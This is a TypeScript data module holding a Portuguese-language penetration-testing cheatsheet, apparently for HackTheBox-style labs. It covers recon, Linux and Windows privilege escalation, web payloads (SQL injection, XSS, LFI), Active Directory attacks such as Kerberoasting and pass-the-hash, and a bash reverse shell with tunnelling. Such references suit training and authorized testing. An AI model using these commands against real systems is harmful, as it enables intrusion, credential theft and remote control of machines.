export type CheatsheetCommand = {
  note: string;
  code: string;
};

export type CheatsheetGroup = {
  subtitle: string;
  items: CheatsheetCommand[];
};

export type Cheatsheet = {
  slug: string;
  kicker: string;
  title: string;
  desc: string;
  groups: CheatsheetGroup[];
};

export const cheatsheets: Cheatsheet[] = [
  {
    slug: 'recon',
    kicker: 'recon',
    title: 'Enumeração',
    desc: 'Varredura de portas e serviços, do scan inicial ao mapa completo do alvo.',
    groups: [
      {
        subtitle: 'Nmap',
        items: [
          { note: 'Scan rápido de todas as portas TCP.', code: 'nmap -p- --min-rate 10000 -T4 10.10.10.10 -oA scan/all-ports' },
          { note: 'Enumeração de versão e scripts nas portas abertas.', code: 'nmap -sCV -p 22,80,443 10.10.10.10 -oA scan/services' },
          { note: 'Descoberta de UDP nas portas mais comuns.', code: 'nmap -sU --top-ports 100 10.10.10.10 -oA scan/udp' },
        ],
      },
      {
        subtitle: 'Web',
        items: [
          { note: 'Fuzzing de diretórios e arquivos.', code: 'ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403' },
          { note: 'Enumeração de subdomínios via vhost.', code: 'gobuster vhost -u http://target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
        ],
      },
      {
        subtitle: 'SMB',
        items: [
          { note: 'Listar shares com sessão nula.', code: 'smbclient -L //10.10.10.10 -N' },
          { note: 'Enumeração completa com enum4linux-ng.', code: 'enum4linux-ng -A 10.10.10.10' },
        ],
      },
    ],
  },
  {
    slug: 'escalation',
    kicker: 'escalation',
    title: 'Privesc Linux',
    desc: 'Escalada de privilégios local: do shell de usuário ao root.',
    groups: [
      {
        subtitle: 'Enumeração inicial',
        items: [
          { note: 'Script automatizado de enumeração.', code: './linpeas.sh -a 2>/dev/null | tee linpeas.txt' },
          { note: 'Binários com SUID setado.', code: 'find / -perm -4000 -type f 2>/dev/null' },
          { note: 'O que posso rodar como root via sudo.', code: 'sudo -l' },
        ],
      },
      {
        subtitle: 'Exploração',
        items: [
          { note: 'Capabilities exploráveis.', code: 'getcap -r / 2>/dev/null' },
          { note: 'Tarefas cron de outros usuários.', code: 'cat /etc/crontab; ls -la /etc/cron.*' },
        ],
      },
    ],
  },
  {
    slug: 'windows',
    kicker: 'windows',
    title: 'Privesc Windows',
    desc: 'Escalada local no Windows, de serviços mal configurados a tokens.',
    groups: [
      {
        subtitle: 'Enumeração',
        items: [
          { note: 'Enumeração automatizada.', code: '.\\winPEASx64.exe quiet' },
          { note: 'Informações do sistema e patches.', code: 'systeminfo' },
          { note: 'Privilégios do token atual.', code: 'whoami /priv' },
        ],
      },
      {
        subtitle: 'Serviços',
        items: [
          { note: 'Serviços com binPath sem aspas.', code: 'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows"' },
          { note: 'Permissões de um serviço com accesschk.', code: 'accesschk.exe /accepteula -uwcqv "Everyone" *' },
        ],
      },
    ],
  },
  {
    slug: 'web',
    kicker: 'web',
    title: 'Web',
    desc: 'Payloads e técnicas para falhas comuns em aplicações web.',
    groups: [
      {
        subtitle: 'SQL Injection',
        items: [
          { note: 'Detecção e dump automatizado com sqlmap.', code: 'sqlmap -u "http://target/item?id=1" --batch --dbs' },
          { note: 'UNION-based: descobrir nº de colunas.', code: "1' ORDER BY 5-- -" },
        ],
      },
      {
        subtitle: 'XSS / SSTI',
        items: [
          { note: 'Payload XSS via atributo de evento (sem tag).', code: '"><img src=x onerror=alert(document.domain)>' },
          { note: 'Detecção de SSTI (Jinja2 / Twig).', code: '{{7*7}}' },
        ],
      },
      {
        subtitle: 'LFI',
        items: [
          { note: 'Wrapper php para ler fonte em base64.', code: 'php://filter/convert.base64-encode/resource=index.php' },
        ],
      },
    ],
  },
  {
    slug: 'directory',
    kicker: 'directory',
    title: 'Active Directory',
    desc: 'Enumeração e movimentação lateral em domínios Windows.',
    groups: [
      {
        subtitle: 'Coleta',
        items: [
          { note: 'Coleta completa para o BloodHound.', code: 'bloodhound-python -u user -p pass -d domain.local -ns 10.10.10.10 -c all' },
          { note: 'Enumeração de usuários e políticas.', code: 'crackmapexec smb 10.10.10.10 -u user -p pass --users' },
        ],
      },
      {
        subtitle: 'Kerberos',
        items: [
          { note: 'Kerberoasting: extrair TGS de contas de serviço.', code: 'impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.10 -request' },
          { note: 'AS-REP roasting de contas sem preauth.', code: 'impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass' },
        ],
      },
      {
        subtitle: 'Lateral',
        items: [
          { note: 'Pass-the-hash via psexec.', code: 'impacket-psexec -hashes :NTHASH domain.local/admin@10.10.10.10' },
        ],
      },
    ],
  },
  {
    slug: 'shells',
    kicker: 'shells',
    title: 'Shells & Pivoting',
    desc: 'Reverse shells, estabilização de TTY e túneis pela rede interna.',
    groups: [
      {
        subtitle: 'Reverse shell',
        items: [
          { note: 'Bash TCP reverso.', code: 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' },
          { note: 'Listener com rlwrap para histórico.', code: 'rlwrap nc -lvnp 4444' },
        ],
      },
      {
        subtitle: 'Estabilizar TTY',
        items: [
          { note: 'Upgrade para PTY interativo completo.', code: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm; stty raw -echo; fg" },
        ],
      },
      {
        subtitle: 'Túneis',
        items: [
          { note: 'Port forwarding reverso com chisel.', code: './chisel client 10.10.14.1:8000 R:1080:socks' },
        ],
      },
    ],
  },
];

export function getCheatsheet(slug: string): Cheatsheet | undefined {
  return cheatsheets.find((c) => c.slug === slug);
}

export function createBlankCheatsheet(slug: string, title = ''): Cheatsheet {
  return { slug, kicker: '', title, desc: '', groups: [] };
}

export function countCommands(sheet: Cheatsheet): number {
  return sheet.groups.reduce((total, g) => total + g.items.length, 0);
}
